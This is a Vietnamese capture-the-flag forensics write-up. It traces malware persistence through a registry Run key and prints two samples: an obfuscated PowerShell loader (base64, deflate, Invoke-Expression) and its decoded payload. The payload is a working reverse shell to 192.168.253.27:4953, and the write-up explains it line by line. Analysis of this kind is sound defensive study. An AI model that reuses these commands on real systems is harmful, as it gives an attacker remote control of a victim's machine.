<img width="1616" height="772" alt="image" src="https://github.com/user-attachments/assets/e1d80143-8a71-44c2-abf7-4cc963014851" />

Ở bài này thì, chúng ta được biết là "Hòa thấy hiện tượng lạ khi **khởi động máy tính**, anh ta có thể đã bị dính 1 mã độc hại trong máy, thông qua việc tải những video không lành mạnh về.

Qua phần description của bài, có thể em cũng suy nghĩ được vị trí của mã độc này nó nằm ở đâu. Vì là mỗi lần khởi động máy tính, thì a này thấy hiện tượng lạ, có thể nó nằm trong key `run` - một key đảm nhiệm trong vai trò chạy những chương trình mỗi khi người dùng khởi động máy tính.

Em thực hiện đi theo path sau: `NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Run`.

<img width="1906" height="452" alt="image" src="https://github.com/user-attachments/assets/6a0886a6-c7dd-4ba3-9b7a-5e494f88abad" />

Chắc chắn đây là nguyên nhân, em copy nó và đưa ra ngoài cho dễ đọc.

```
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "(neW-obJEct io.COMprEssIon.dEFlATesTReAm( [sySTem.IO.memorYSTREam] [coNVeRT]::FRoMBAse64stRInG( 'TVFva4JAGP8qh7hxx/IwzbaSBZtsKwiLGexFhJg+pMs09AmL6rvP03S9uoe739/nZD+OIEHySmwolNn6F3wkzilH2HEbkDupvwXM+cKaWxWSSt2Bxrv9F64ZOteepU5vYOjMlHPMwNuVQnItyb8AneqOMnO5PiEsVytZnHkJUjnvG4ZuXB7O6tUswigGSuVI0Gsh/g1eQGt8h6gdUo98CskGQ8aIkgBR2dmUAw+9kkfvCiiL0x5sbwdNlQUckb851mTykfhpECUbdstXjo2LMIlEE0iCtedvhWgER1I7aKPHLrmQ2QGVmkbuoFoVvOE9Eckaj8+26vbcTeomqptjL3OLUM/0q1Q+030RMD73MBTYEZFuSmUMYbpEERduSVfDYZW8SvwuktJ/33bx/CeLEGirU7Zp52ZpLfYzPuQhZVez+SsrTnOg7A8='), [SYSTEM.iO.ComPReSSion.CoMPrEsSIonmODe]::DeCOmpresS)|FOREAcH-object{ neW-obJEct io.streAMrEadeR( $_,[sysTem.TExt.EnCoDING]::asCIi )}).reaDToEnD()|inVOKe-exprEsSIon"
```
 Giờ em sẽ phân tích qua đoạn script này qua:

 - Đầu tiên attacker sẽ chuyển cái chuỗi dài kia từ base64 thành dạng byte bằng hàm ` [coNVeRT]::FRoMBAse64stRInG(....)`

 - Sau đó tiếp tục dùng chuỗi byte đó và đóng gói/nén vào dạng `gzip/deflates` attacker dùng lệnh này để nén nó lại `io.COMprEssIon.dEFlATesTReAm(...,` xong sau đó sẽ dùng thêm 1 đoạn mã ` [SYSTEM.iO.ComPReSSion.CoMPrEsSIonmODe]::DeCOmpresS)`, dùng để giải nén cục dữ liệu byte đã được nén lại trước đó.

 - Khi gọi hàm `.readToEnd()` thì lúc này đoạn script bắt đầu thực hiện việc giải nén cái cục dữ liệu đó ra, và thực hiện chuyển đổi nó sang dạng có thể đọc được bằng lệnh này `neW-obJEct io.streAMrEadeR( $_,[sysTem.TExt.EnCoDING]::asCIi`, lúc này dữ liệu byte sẽ chuyển thành dạng ASCII mà máy tính có thể hiểu được.

 - Và cuối cùng dùng kĩ thuật `Invoke-exprEsSIon - IEX`, kĩ thuật này cho phép chạy lệnh ngay lập tức và không cần nó lưu file lại vào ổ cứng, đây gọi là kĩ thuật `Fileless Malware`. Việc này giúp cho attacker có thể chạy lệnh, mà không để lại giấu vết, vì nếu như bình thường để chạy 1 lệnh nào đấy thì, chúng ta phải lưu file đó lại vào ổ cứng, nó làm để lại giấu vết trong máy.

Bây giờ chúng ta chỉ cần thực hiện giải mã chuỗi base64 bên trong ra để lấy được payload bên trong nó là gì:

<img width="3065" height="1785" alt="image" src="https://github.com/user-attachments/assets/16c751d4-a67b-44bd-a47b-f9b6ddb1b486" />

Chúng ta thực hiện giải mã chuỗi base64 ra, và thực hiện inflate `giai nen` no ra thì mới xuất hiện được payload.

Tiếp theo chúng ta nhận được 1 đoạn mã:
```
$client = New-Object System.Net.Sockets.TCPClient("192.168.253.27",4953);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "CHH{N0_4_go_n0_st4r_wh3r3}" + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()
}
$client.Close()
```
Đầu tiên attacker sử dụng kĩ thuật (Socket Connection) để tạo kết nối ngược từ máy victim tới máy của attacker (reverse shell), kĩ thuật này cho phép vượt qua được các block tường lửa, nếu attacker thực hiện kết nối tới máy của victim thì sẽ bị chặn lại. 
- Ở đây kết victim sẽ kết nối tới máy attacker tại ip: `192.168.253.27/ port 4953`

- Dùng hàm `Getstream()` để có thể gửi và nhận dữ liệu.

Tiếp theo attacker tạo ra một mảng byte `[byte[]]` có kischt hước khoảng (64kb) để thực hiện chứa các dữ liệu trước khi nó được xử lí
- Kĩ thuật `0..65535|%{0};` khởi tạo tất cả các giá trị trong mnagr bằng 0 (giúp làm sạch bộ đêm tránh trường hợp trong mảng có dữ liệu và làm thất thoát dữ liệu nhận về từ attacker hoặc bị buffer overflow)

`while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)` hàm while này cho phép mã độc duy trì kết nối liên tục, để có thể liên tục gõ được nhiều lệnh. `$stream.Read(...)` lệnh này cho phép tạm dừng quá trình lắng nghe và chờ cho đến khi kẻ tấn công gửi dữ liệu đến tiếp, thông qua RCE.
  - Vào phần lõi của vòng lặp while, kẻ tấn công bắt đầu thực hiện tấn công RCE. Hàm `Getstrings` sẽ nhận dữ liệu và chuyển nó về dạng `ASCII` để powershell có thể đọc được.

  - `(iex $data 2>&1 | Out-String );` nó lưu đoạn mã này vào biến sendback thực hiện gửi về cho victim. Kĩ thuật `iex $data 2>&1` nó sẽ thực thi biến data ngay lập tức mà mà không cần lưu file lại, đồng thời gộp cả luồng lỗi (khi attacker nhập lệnh powershell sai) vào cả luồng đầu ra, để hắn có thể biết được mình đang nhập lệnh đúng hay sai. Đây gọi là kĩ thuật `Redirection`.

  - `$sendback2 = $sendback + "CHH{N0_4_go_n0_st4r_wh3r3}" + (pwd).Path + "> ";` kĩ thuật này cho phép hắn giả mạo như đang ngồi trên một máy tính thật, hiện ra dòng path kèm với ">" giống giao diện `powershell` thông thường. Kèm với **flag của bài: "CHH{N0_4_go_n0_st4r_wh3r3}"**.

  - Cuối cùng thực hiện mã hóa biến `sendback2` thành byte và chuyển về máy của attacker. 

Đây là một chain attack, `RCE - Reverse Shell` khá phổ biến. Kẻ tấn công lợi dụng việc tải về các dữ liệu không rõ nguồn gốc của người dùng, thực hiện chạy mã độc trên máy nạn nhân trong key `run` để duy trì `persistence`. Trong payload mã độc thực hiện tạo kết nối tới máy của attacker, và chạy các lệnh độc hại từ máy của hắn gửi về cho victim.
